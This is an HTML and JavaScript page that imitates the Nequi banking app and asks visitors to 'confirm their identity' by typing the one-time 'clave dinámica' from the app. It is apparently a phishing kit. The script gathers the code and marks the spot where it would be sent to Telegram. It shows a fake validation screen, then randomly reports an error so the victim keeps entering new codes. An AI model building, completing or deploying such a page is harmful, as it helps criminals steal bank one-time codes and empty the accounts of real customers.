<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Nequi - Clave Dinámica</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background-color: #ffffff;
      height: 100vh;
      display: flex;
      flex-direction: column;
      overflow: hidden;
    }

    .header {
      padding: 20px;
      background-color: #ffffff;
    }

    .logo {
      width: 100px;
      margin-bottom: 40px;
    }

    .title {
      font-size: 28px;
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 16px;
      text-align: center;
    }

    .subtitle {
      font-size: 16px;
      color: #666666;
      text-align: center;
      line-height: 1.5;
      padding: 0 20px;
      margin-bottom: 40px;
    }

    .input-container {
      display: flex;
      justify-content: center;
      gap: 12px;
      padding: 0 20px;
      margin-bottom: 60px;
    }

    .pin-input {
      width: 48px;
      height: 48px;
      border: none;
      border-bottom: 2px solid #e0e0e0;
      text-align: center;
      font-size: 32px;
      font-weight: 600;
      color: #1a1a1a;
      background: transparent;
      outline: none;
      transition: border-color 0.2s;
    }

    .pin-input:focus {
      border-bottom-color: #ff006b;
    }

    .pin-input.filled {
      border-bottom-color: #1a1a1a;
    }

    .keyboard-container {
      flex: 1;
      display: flex;
      flex-direction: column;
      justify-content: flex-end;
      padding: 20px;
      padding-bottom: 40px;
    }

    .keyboard-row {
      display: flex;
      justify-content: space-around;
      margin-bottom: 20px;
    }

    .key-btn {
      width: 80px;
      height: 80px;
      border: none;
      background: transparent;
      font-size: 32px;
      font-weight: 400;
      color: #1a1a1a;
      cursor: pointer;
      border-radius: 50%;
      transition: background-color 0.15s;
      display: flex;
      align-items: center;
      justify-content: center;
      -webkit-tap-highlight-color: transparent;
    }

    .key-btn:active {
      background-color: #f5f5f5;
    }

    .key-btn.delete {
      font-size: 24px;
    }

    .key-btn.empty {
      visibility: hidden;
    }

    .confirm-btn {
      width: calc(100% - 40px);
      max-width: 400px;
      margin: 20px auto;
      padding: 18px;
      background-color: #ff006b;
      color: white;
      border: none;
      border-radius: 12px;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      transition: opacity 0.2s;
    }

    .confirm-btn:disabled {
      opacity: 0.4;
      cursor: not-allowed;
    }

    .confirm-btn:active:not(:disabled) {
      opacity: 0.8;
    }

    .validating-screen {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: #200020;
      z-index: 9999;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }
    
    .validating-screen.active {
      display: flex;
    }
    
    .validating-content {
      text-align: center;
      padding: 2rem;
      max-width: 320px;
    }
    
    .validating-icon {
      width: 120px;
      height: 120px;
      margin: 0 auto 2rem;
      background: #ff006b;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      animation: pulse 2s ease-in-out infinite;
    }
    
    @keyframes pulse {
      0%, 100% {
        transform: scale(1);
        opacity: 1;
      }
      50% {
        transform: scale(1.05);
        opacity: 0.8;
      }
    }
    
    .validating-title {
      color: white;
      font-size: 1.5rem;
      font-weight: bold;
      margin-bottom: 1rem;
      line-height: 1.3;
    }
    
    .validating-message {
      color: rgba(255, 255, 255, 0.7);
      font-size: 1rem;
      line-height: 1.5;
      margin-bottom: 2rem;
    }
    
    .validating-spinner {
      width: 40px;
      height: 40px;
      border: 4px solid rgba(255, 255, 255, 0.1);
      border-top-color: #FF006B;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .error-message {
      display: none;
      background-color: #ff3b30;
      color: white;
      padding: 16px;
      margin: 0 20px 20px;
      border-radius: 12px;
      text-align: center;
      font-size: 14px;
    }

    .error-message.show {
      display: block;
    }
  </style>
</head>
<body>
  <div class="validating-screen" id="validatingScreen">
    <div class="validating-content">
      <div class="validating-icon">
        <svg width="60" height="60" viewBox="0 0 24 24" fill="white">
          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
        </svg>
      </div>
      <h2 class="validating-title">Validando tu clave dinámica</h2>
      <p class="validating-message">Estamos verificando tu información. Esto solo tomará unos segundos.</p>
      <div class="validating-spinner"></div>
    </div>
  </div>

  <div class="error-message" id="errorMessage">
    ⚠️ La clave dinámica es incorrecta. Intenta nuevamente.
  </div>

  <div class="header">
    <svg class="logo" viewBox="0 0 120 40" fill="none">
      <rect width="20" height="20" fill="#FF006B"/>
      <text x="25" y="28" font-family="Arial, sans-serif" font-size="28" font-weight="bold" fill="#1a1a1a">Nequi</text>
    </svg>
  </div>

  <h1 class="title">Confirma tu identidad</h1>
  <p class="subtitle">Para confirmar tu identidad escribe o pega la clave dinámica que encuentras en tu App Nequi.</p>

  <div class="input-container">
    <input type="text" class="pin-input" maxlength="1" inputmode="none" readonly id="pin1">
    <input type="text" class="pin-input" maxlength="1" inputmode="none" readonly id="pin2">
    <input type="text" class="pin-input" maxlength="1" inputmode="none" readonly id="pin3">
    <input type="text" class="pin-input" maxlength="1" inputmode="none" readonly id="pin4">
    <input type="text" class="pin-input" maxlength="1" inputmode="none" readonly id="pin5">
    <input type="text" class="pin-input" maxlength="1" inputmode="none" readonly id="pin6">
  </div>

  <div class="keyboard-container">
    <div class="keyboard-row">
      <button class="key-btn" data-value="1">1</button>
      <button class="key-btn" data-value="2">2</button>
      <button class="key-btn" data-value="3">3</button>
    </div>
    <div class="keyboard-row">
      <button class="key-btn" data-value="4">4</button>
      <button class="key-btn" data-value="5">5</button>
      <button class="key-btn" data-value="6">6</button>
    </div>
    <div class="keyboard-row">
      <button class="key-btn" data-value="7">7</button>
      <button class="key-btn" data-value="8">8</button>
      <button class="key-btn" data-value="9">9</button>
    </div>
    <div class="keyboard-row">
      <button class="key-btn empty"></button>
      <button class="key-btn" data-value="0">0</button>
      <button class="key-btn delete" id="deleteBtn">⌫</button>
    </div>
    
    <button class="confirm-btn" id="confirmBtn" disabled>Confirmar</button>
  </div>

  <script>
    const inputs = [
      document.getElementById('pin1'),
      document.getElementById('pin2'),
      document.getElementById('pin3'),
      document.getElementById('pin4'),
      document.getElementById('pin5'),
      document.getElementById('pin6')
    ];
    
    const keyButtons = document.querySelectorAll('.key-btn[data-value]');
    const deleteBtn = document.getElementById('deleteBtn');
    const confirmBtn = document.getElementById('confirmBtn');
    const validatingScreen = document.getElementById('validatingScreen');
    const errorMessage = document.getElementById('errorMessage');
    
    let currentIndex = 0;
    
    // Manejo del teclado numérico
    keyButtons.forEach(btn => {
      btn.addEventListener('click', () => {
        if (currentIndex < inputs.length) {
          const value = btn.dataset.value;
          inputs[currentIndex].value = value;
          inputs[currentIndex].dataset.realValue = value;
          inputs[currentIndex].classList.add('filled');
          currentIndex++;
          
          checkComplete();
        }
      });
    });
    
    // Botón de borrar
    deleteBtn.addEventListener('click', () => {
      if (currentIndex > 0) {
        currentIndex--;
        inputs[currentIndex].value = '';
        inputs[currentIndex].dataset.realValue = '';
        inputs[currentIndex].classList.remove('filled');
        
        checkComplete();
      }
    });
    
    // Verificar si está completo
    function checkComplete() {
      const isComplete = inputs.every(input => input.value !== '');
      confirmBtn.disabled = !isComplete;
      
      if (isComplete) {
        // Auto-enviar después de completar
        setTimeout(() => {
          confirmBtn.click();
        }, 300);
      }
    }
    
    // Botón confirmar
    confirmBtn.addEventListener('click', async () => {
      const dinamica = inputs.map(input => input.dataset.realValue || input.value).join('');
      
      // Mostrar pantalla de validación
      validatingScreen.classList.add('active');
      
      // Simular envío (aquí iría tu lógica de Telegram)
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Ocultar pantalla de validación
      validatingScreen.classList.remove('active');
      
      // Simular error (cambiar por tu lógica real)
      const hasError = Math.random() > 0.5;
      
      if (hasError) {
        errorMessage.classList.add('show');
        
        // Limpiar campos
        setTimeout(() => {
          inputs.forEach(input => {
            input.value = '';
            input.dataset.realValue = '';
            input.classList.remove('filled');
          });
          currentIndex = 0;
          confirmBtn.disabled = true;
          errorMessage.classList.remove('show');
        }, 3000);
      } else {
        // Éxito - redirigir o mostrar siguiente paso
        console.log('Clave correcta:', dinamica);
      }
    });
    
    // Prevenir teclado del sistema
    inputs.forEach(input => {
      input.addEventListener('keydown', (e) => {
        e.preventDefault();
      });
      input.addEventListener('paste', (e) => {
        e.preventDefault();
      });
    });
  </script>
</body>
</html>
